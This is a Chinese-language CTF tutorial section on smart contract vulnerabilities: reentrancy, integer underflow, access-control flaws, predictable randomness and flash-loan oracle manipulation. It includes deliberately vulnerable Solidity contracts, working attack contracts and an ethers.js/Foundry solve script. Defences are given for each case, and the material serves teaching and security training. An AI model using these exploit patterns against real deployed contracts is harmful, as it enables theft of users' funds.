# 智能合约 CTF

### 5.1 重入漏洞题型

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

// 漏洞合约
contract VulnVault {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // 漏洞：先转账后更新余额 → 重入攻击
    function withdraw() public {
        uint256 amount = balances[msg.sender];
        (bool ok, ) = msg.sender.call{value: amount}("");  // ← 先转账
        require(ok);
        balances[msg.sender] = 0;  // ← 后更新（此时可被重入）
    }
}

// 攻击合约
contract Attack {
    VulnVault public vault;

    constructor(address _vault) {
        vault = VulnVault(_vault);
    }

    // 接收以太币时触发重入
    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();  // ← 余额未清零，再次提取
        }
    }

    function attack() public payable {
        vault.deposit{value: 1 ether}();
        vault.withdraw();  // 触发重入
    }
}
```

```
重入漏洞原理：
1. 攻击者存入 1 ETH
2. 调用 withdraw()
3. vault 转账 1 ETH 给攻击者
4. 攻击者 receive() 被触发
5. 余额仍为 1（未清零），再次调用 withdraw()
6. 循环提取直到 vault 余额为 0

防御：CEI 模式（Checks-Effects-Interactions）
1. Checks    → 检查条件
2. Effects   → 先更新状态
3. Interactions → 最后外部调用
```

### 5.2 整数溢出题型

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

// 漏洞合约（Solidity < 0.8.0）
contract VulnToken {
    mapping(address => uint256) public balances;

    function transfer(address to, uint256 amount) public {
        // 漏洞：无 SafeMath，整数下溢
        balances[msg.sender] -= amount;  // 0 - 1 = 2^256-1（下溢）
        balances[to] += amount;
    }
}

// CTF 解题：
// 1. 账户余额为 0
// 2. transfer 转出 1 → 下溢 → 余额变为最大值
// 3. 现在拥有大量 token，满足条件获取 Flag

// 注意：Solidity 0.8.0+ 默认检查溢出，此漏洞仅适用于旧版本
// 防御：使用 SafeMath 或升级到 0.8.0+
```

### 5.3 访问控制题型

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

// 漏洞合约 1：缺少权限检查
contract VulnAccess1 {
    address public owner;
    bool public solved;

    constructor() {
        owner = msg.sender;
    }

    // 漏洞：缺少 onlyOwner 修饰符
    function setSolved(bool _solved) public {
        solved = _solved;  // 任何人可调用！
    }
}

// 漏洞合约 2：tx.origin 鉴权
contract VulnAccess2 {
    address public owner;
    bool public solved;

    constructor() {
        owner = msg.sender;
    }

    modifier auth() {
        // 漏洞：使用 tx.origin 而非 msg.sender
        require(tx.origin == owner, "Not authorized");
        _;
    }

    function setSolved() auth public {
        solved = true;
    }
}

// 攻击：诱导 owner 调用攻击合约
contract PhishingAttack {
    VulnAccess2 target;

    function attack() public {
        target.setSolved();  // tx.origin == owner，通过鉴权
    }
}

// 防御：使用 msg.sender 进行鉴权
// modifier auth() { require(msg.sender == owner); _; }
```

### 5.4 随机数预测题型

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

// 漏洞合约：可预测随机数
contract VulnLottery {
    uint256 public seed;
    bool public solved;

    constructor() {
        seed = block.timestamp;  // ← 可预测
    }

    function guess(uint256 _number) public {
        // 漏洞：随机数基于可预测的区块数据
        uint256 answer = uint256(
            keccak256(abi.encodePacked(seed, block.timestamp, block.difficulty))
        ) % 100;

        if (_number == answer) {
            solved = true;
        }
    }
}

// 攻击合约：复制随机数生成逻辑
contract Attack {
    VulnLottery target;

    function attack() public {
        // 在同一交易中计算相同的"随机数"
        uint256 answer = uint256(
            keccak256(abi.encodePacked(target.seed(), block.timestamp, block.difficulty))
        ) % 100;

        target.guess(answer);  // 100% 命中
    }
}

// 防御：使用 Chainlink VRF / commit-reveal 方案
```

### 5.5 闪电贷题型

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

// 漏洞场景：价格预言机依赖单一 DEX
contract VulnOracle {
    IDEX public dex;       // 去中心化交易所
    IERC20 public token;

    function getPrice() public view returns (uint256) {
        // 漏洞：直接从单一 DEX 获取价格
        (uint256 reserve0, uint256 reserve1) = dex.getReserves();
        return reserve1 * 1e18 / reserve0;  // 可被闪电贷操纵
    }

    function buyWithDiscount() public {
        uint256 price = getPrice();
        require(price < 0.5 ether, "Price too high");
        // 以操纵后的低价购买
    }
}

// 攻击流程：
// 1. 闪电贷借入大量 ETH
// 2. 在 DEX 中大量买入 token → 推高 token 价格（或卖出砸低）
// 3. 操纵后调用 VulnOracle 的函数
// 4. 归还闪电贷，赚取差价

// 防御：使用去中心化预言机（Chainlink）/ TWAP（时间加权平均价格）/ 多源价格聚合
```

### 5.6 实战案例：模拟一道 Solidity CTF 题

```
题目：ReentranceVault
描述：一个存取款合约，提取所有资金获取 Flag
难度：★★★

合约部署在测试网络，使用 Foundry 或 Hardhat 交互

解题脚本：
```

```javascript
// JavaScript (ethers.js) - 解题脚本
const { ethers } = require('ethers');

// 连接到 CTF 测试网络
const provider = new ethers.JsonRpcProvider('https://testnet-rpc.example.com');
const wallet = new ethers.Wallet('YOUR_PRIVATE_KEY', provider);

// 漏洞合约 ABI
const vaultAbi = [
    'function deposit() payable',
    'function withdraw()',
    'function balances(address) view returns (uint256)',
    'function isSolved() view returns (bool)'
];

const attackAbi = [
    'function attack() payable'
];

async function solve() {
    const vault = new ethers.Contract(
        '0x1234...vaultAddress', vaultAbi, wallet
    );

    // 部署攻击合约
    const AttackFactory = new ethers.ContractFactory(
        attackAbi, attackBytecode, wallet
    );
    const attack = await AttackFactory.deploy(vault.target);
    await attack.waitForDeployment();
    console.log('攻击合约:', await attack.getAddress());

    // 执行攻击
    const tx = await attack.attack({ value: ethers.parseEther('0.5') });
    await tx.wait();
    console.log('攻击完成');

    // 验证
    const solved = await vault.isSolved();
    console.log('Solved:', solved);
}

solve();
```

```bash
# 使用 Foundry 解题
# 1. 初始化项目
forge init reentrance-solve
cd reentrance-solve

# 2. 编写攻击合约和测试
# test/Attack.t.sol

# 3. 在本地 fork 网络测试
forge test --fork-url https://testnet-rpc.example.com -vv

# 4. 执行攻击脚本
forge script script/Attack.s.sol --fork-url https://testnet-rpc.example.com \
  --private-key $PRIVATE_KEY --broadcast
```

---

---

